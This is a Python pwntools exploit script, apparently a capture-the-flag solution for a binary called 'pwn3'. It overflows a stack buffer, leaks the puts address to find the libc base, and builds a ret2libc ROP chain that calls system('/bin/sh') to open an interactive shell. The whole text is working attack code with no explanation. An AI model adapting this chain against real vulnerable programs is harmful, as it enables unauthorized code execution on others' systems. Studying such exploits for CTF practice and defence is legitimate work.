from pwn import *
elf = context.binary = ELF('../src/pwn3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # This is my libc so it'll change for the docker
io = elf.process()
offset = 40
rop = ROP(elf)
rop.raw(b'A'*offset)
rop.puts(elf.got.puts)
rop.main()
io.sendline(rop.chain())
io.readuntil(b'n00bz{f4k3_fl4g}\n')
puts = unpack(io.readline().strip().ljust(8, b'\x00'))
print(hex(puts))
libc.address = puts - libc.symbols.puts
print(hex(libc.address))
rop = ROP(libc)
rop.raw(b'A'*40)
rop.raw(pack(0x000000000040101a))
rop.system(next(libc.search(b'/bin/sh\x00')))
io.sendline(rop.chain())
io.interactive()